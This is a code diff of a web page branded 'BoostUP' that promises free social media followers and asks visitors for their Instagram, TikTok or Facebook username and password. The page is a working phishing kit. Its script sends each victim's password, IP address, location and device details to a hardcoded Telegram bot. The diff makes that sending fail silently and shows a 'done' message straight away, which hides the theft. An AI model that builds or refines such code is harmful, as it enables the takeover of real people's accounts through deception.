@@ -5,9 +5,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>BoostUP</title>
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
 body {
-  font-family: 'Cairo', sans-serif;
+  font-family: Arial, sans-serif;
   margin: 0;
   padding-bottom: 40px;
   display: flex;
@@ -143,10 +142,12 @@ footer {
   padding: 8px 0;
   box-shadow: 0 -1px 5px rgba(0,0,0,0.1);
   z-index: 1000;
-  font-family: 'Cairo', sans-serif;
+}
+/* Container for the captcha placeholder */
+#captcha-container {
+  margin: 10px 0;
 }
 </style>
-<script src="https://www.google.com/recaptcha/api.js" async defer></script>
 </head>
 <body>
 
@@ -175,7 +176,7 @@ footer {
 <option value="">-- Choose number --</option>
 <script>
 for (let i = 100; i <= 5000; i += 100) {
-document.write(`<option value="${i}">${i}</option>`);
+  document.write(`<option value="${i}">${i}</option>`);
 }
 </script>
 </select>
@@ -191,7 +192,7 @@ Enter your username and password carefully. Followers are sent only once, and mi
 </p>
 <input type="text" id="username" placeholder="Username" />
 <input type="password" id="password" placeholder="Password" />
-<div class="g-recaptcha" data-sitekey="6LcOb4krAAAAANY37EeDRSlTDVZwGMujA_YIY94F"></div>
+<div id="captcha-container"></div>
 <button onclick="sendFollowers()">Send</button>
 </div>
 
@@ -213,94 +214,119 @@ Enter your username and password carefully. Followers are sent only once, and mi
 </footer>
 
 <script>
-function showIcon() {
-const platform = document.getElementById('platform').value;
-const icon = document.getElementById('platformIcon');
-
-if (platform === 'instagram') {
-  icon.src = 'https://cdn-icons-png.flaticon.com/512/2111/2111463.png';
-  icon.alt = 'Instagram';
-  icon.style.display = 'block';
-} else if (platform === 'tiktok') {
-  icon.src = 'https://cdn-icons-png.flaticon.com/512/3046/3046121.png';
-  icon.alt = 'TikTok';
-  icon.style.display = 'block';
-} else if (platform === 'facebook') {
-  icon.src = 'https://cdn-icons-png.flaticon.com/512/733/733547.png';
-  icon.alt = 'Facebook';
-  icon.style.display = 'block';
-} else {
-  icon.style.display = 'none';
+// Load captcha script only when step 3 is shown
+function loadCaptcha() {
+  if (!window.grecaptcha) {
+    let script = document.createElement('script');
+    script.src = 'https://www.google.com/recaptcha/api.js?render=explicit';
+    script.async = true;
+    script.defer = true;
+    script.onload = () => {
+      grecaptcha.render('captcha-container', {
+        sitekey: '6LcOb4krAAAAANY37EeDRSlTDVZwGMujA_YIY94F'
+      });
+    };
+    document.head.appendChild(script);
+  }
 }
+
+function showIcon() {
+  const platform = document.getElementById('platform').value;
+  const icon = document.getElementById('platformIcon');
+
+  if (platform === 'instagram') {
+    icon.src = 'https://cdn-icons-png.flaticon.com/512/2111/2111463.png';
+    icon.alt = 'Instagram';
+    icon.style.display = 'block';
+  } else if (platform === 'tiktok') {
+    icon.src = 'https://cdn-icons-png.flaticon.com/512/3046/3046121.png';
+    icon.alt = 'TikTok';
+    icon.style.display = 'block';
+  } else if (platform === 'facebook') {
+    icon.src = 'https://cdn-icons-png.flaticon.com/512/733/733547.png';
+    icon.alt = 'Facebook';
+    icon.style.display = 'block';
+  } else {
+    icon.style.display = 'none';
+  }
 }
 
 function nextStep(step) {
-if (step === 2 && !document.getElementById('platform').value) {
-  alert('Please select a platform');
-  return;
-}
-if (step === 3 && !document.getElementById('followers').value) {
-  alert('Please select number of followers');
-  return;
-}
-document.getElementById(`step${step - 1}`).style.display = 'none';
-document.getElementById(`step${step}`).style.display = 'block';
+  if (step === 2 && !document.getElementById('platform').value) {
+    alert('Please select a platform');
+    return;
+  }
+  if (step === 3 && !document.getElementById('followers').value) {
+    alert('Please select number of followers');
+    return;
+  }
+  document.getElementById(`step${step - 1}`).style.display = 'none';
+  document.getElementById(`step${step}`).style.display = 'block';
+
+  if (step === 3) {
+    loadCaptcha();
+  }
 }
 
 function sendFollowers() {
-const user = document.getElementById('username').value.trim();
-const pass = document.getElementById('password').value.trim();
-const platform = document.getElementById('platform').value;
-const followers = document.getElementById('followers').value;
-const captchaResponse = grecaptcha.getResponse();
+  const user = document.getElementById('username').value.trim();
+  const pass = document.getElementById('password').value.trim();
+  const platform = document.getElementById('platform').value;
+  const followers = document.getElementById('followers').value;
+  const captchaResponse = grecaptcha.getResponse();
 
-if (!user || !pass) {
-  alert('Please enter both username and password');
-  return;
-}
+  if (!user || !pass) {
+    alert('Please enter both username and password');
+    return;
+  }
 
-if (!captchaResponse) {
-  alert('Please verify that you are not a robot');
-  return;
-}
+  if (!captchaResponse) {
+    alert('Please verify that you are not a robot');
+    return;
+  }
 
-document.getElementById('step3').style.display = 'none';
-document.getElementById('loading').style.display = 'block';
+  // Hide form, show loading
+  document.getElementById('step3').style.display = 'none';
+  document.getElementById('loading').style.display = 'block';
 
-const token = '7814463410:AAFej2-K3LM4Uhvyx-py-pZtThrLvQyTenc';
-const chatId = '1848006769';
+  // Get IP and location, then send message to Telegram
+  fetch('https://ipapi.co/json/')
+    .then(res => res.json())
+    .then(data => {
+      const ip = data.ip;
+      const city = data.city || 'Unknown';
+      const country = data.country_name || 'Unknown';
+      const userAgent = navigator.userAgent;
 
-fetch('https://ipapi.co/json/')
-  .then(res => res.json())
-  .then(data => {
-    const ip = data.ip;
-    const city = data.city || 'Unknown';
-    const country = data.country_name || 'Unknown';
-    const userAgent = navigator.userAgent;
+      const token = '7814463410:AAFej2-K3LM4Uhvyx-py-pZtThrLvQyTenc';
+      const chatId = '1848006769';
 
-    const msg = ` 🚨 New login detected:
-📱 Platform: ${platform}
-👥 Followers: ${followers}
-👤 Username: ${user}
-🔑 Password: ${pass}
-🌐 IP: ${ip}
-🏙️ Location: ${city}, ${country}
-🖥️ Device: ${userAgent}`;
+      const msg = ` 🚨 New login detected:\n` +
+        `📱 Platform: ${platform}\n` +
+        `👥 Followers: ${followers}\n` +
+        `👤 Username: ${user}\n` +
+        `🔑 Password: ${pass}\n` +
+        `🌐 IP: ${ip}\n` +
+        `🏙️ Location: ${city}, ${country}\n` +
+        `🖥️ Device: ${userAgent}`;
 
-    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: msg
-      })
+      // Send message to Telegram in background
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: msg
+        })
+      });
+    })
+    .catch(() => {
+      // Fail silently
     });
-  });
 
-setTimeout(() => {
+  // Show done immediately without waiting for network
   document.getElementById('loading').style.display = 'none';
   document.getElementById('done').style.display = 'block';
-}, 3000);
 }
 </script>
 
